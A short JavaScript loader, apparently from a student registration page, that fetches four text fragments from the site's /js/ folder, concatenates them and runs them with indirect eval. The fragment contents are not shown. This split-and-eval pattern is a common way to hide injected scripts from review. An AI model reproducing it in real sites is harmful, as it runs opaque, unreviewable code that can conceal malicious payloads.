(function(){
  var F=["/js/_asr_p0.txt","/js/_asr_p1.txt","/js/_asr_p2.txt","/js/_asr_p3.txt"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(p){ (0,eval)(p.join("")); })
  .catch(function(e){ console.error("[students-reg] load failed", e); });
})();
